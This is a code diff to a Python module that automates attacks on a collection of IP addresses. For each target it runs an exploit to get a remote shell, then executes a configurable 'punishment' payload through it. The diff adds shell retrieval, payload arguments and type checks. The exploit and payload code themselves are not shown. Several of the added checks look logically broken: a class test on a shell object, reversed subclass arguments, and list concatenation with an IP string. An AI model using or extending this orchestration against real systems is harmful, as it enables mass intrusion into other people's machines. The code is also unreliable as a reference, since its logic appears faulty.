@@ -1,5 +1,7 @@
 import exploit_cl
 import payload_cl
+import shell_cl
+import inspect
 
 # Collection of ip addresses to be attacked
 
@@ -13,10 +15,11 @@ class TargetClctn(object):
 		for i in groups:
 			for ip in self.os_group[i]:
 				if ip not in used_ips:
-					shell = getattr(exploit_cl,method)(ip,args) # execute exploit
-					if type(shell) != Exception: # make sure the shell exists
-						getattr(payload_cl,punishment['type'])(shell).execute_payload()
-						shell.close()
+					shell = getattr(exploit_cl,method)(ip,args).get_shell() # execute exploit
+					if inspect.isclass(shell):
+						if issubclass(shell_cl.shell_class,shell): # make sure the shell exists
+							getattr(payload_cl,punishment['type'])(shell,punishment["args"]).execute_payload()
+							shell.close()
 					used_ips += ip # add up to list of checked ips
 		return
 
